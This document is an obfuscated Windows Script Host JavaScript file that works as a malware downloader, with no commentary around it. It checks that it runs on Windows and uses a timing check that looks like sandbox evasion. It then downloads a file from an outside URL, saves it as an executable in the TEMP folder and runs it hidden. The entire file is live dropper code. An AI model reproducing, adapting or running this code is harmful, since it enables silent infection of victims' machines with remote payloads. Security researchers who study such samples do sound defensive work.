var _Q = false;
var _SY = "CreateObject";
var _MF = function _CD() {return WScript[_SY]("WScript"+".Shell");}(), _EC = 11;
var _S = "MSXML2.XMLHTTP";
var _X = 2123213;
var _B = 0;
function _W(_BI){_MF["Run"](_BI, _B, _B);};
function _NI(){return _S + "";};
function _RT(_W0, _U){_B = _B * 1; return _W0 - _U;};
function _DQ(){return _SY;};
/*@cc_on
  @if (@_win32 || @_win64)
    _Q = true;
  @end
@*/
if (_Q)
{
var _T = "";
function _AV(){return 22;};
var _V = 0; var _A = 0;
function _CG()
{
var _LR = new this["Date"]();
var _WE = _LR["getUTCMilliseconds"]();
WScript["Sleep"](_AV());
var _LR = new this["Date"]();
var _H = _LR["getUTCMilliseconds"]();
WScript["Sleep"](_AV());
var _LR = new this["Date"]();
var _C = _LR["getUTCMilliseconds"]();
var _V = "_L";
_V = _RT(_H, _WE);
var _A = "_LU";
_A = _RT(_C, _H);
_T = "open";
return _RT(_V, _A);
}
var _VY = false;
var _ID = false;
for (var _I = _B; _I < _AV() * 1; _I++){if (_CG() != _B){
_VY = true; 
_A = "31" + 11 * _V + _A; 
_ID = true; 
break;
}}
function _K() {return ((_VY == true) && (_VY == _ID)) ? 1 : _B;};
if (_VY && _K() && _ID){
function _CQ() {return _MF["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "MyXmQJJRbS.ex" + "e";};
 _GA = _NI();
 _T0 = WScript[_SY](_GA);
 var _HT = 1;
 while (_HT){
try {
	if (_HT == 1)
	{
		_T0[_T]("GET", "http://srijanexportstowelwarmers.co.uk/k9owpa", false);
		_T0["send"]();
		_AO = "Sleep";
	}
	WScript[_AO](_AV() + 120); 
	if (_T0["readystate"] < 2 * 2) continue;
	_HT = _B;
	function _CM(_FJ) {var _WY = (1, 2, 3, 4, 5, _FJ); return _WY;};
	_KU = WScript[_DQ()]("ADODB.Stream");
	_GA = _KU;
	_GA[_T]();
	_GA["type"] = _CM(1);
	_GA["write"](_T0["ResponseBody"]);
	_KU["position"] = _CM(_B);
	_GA["Save" + "ToFile"](_CQ(), 2);
	_KU["cl"+"ose"]();
	_Y = _CQ();
	_W(_Y);
} catch(_BN){};
}
}
}

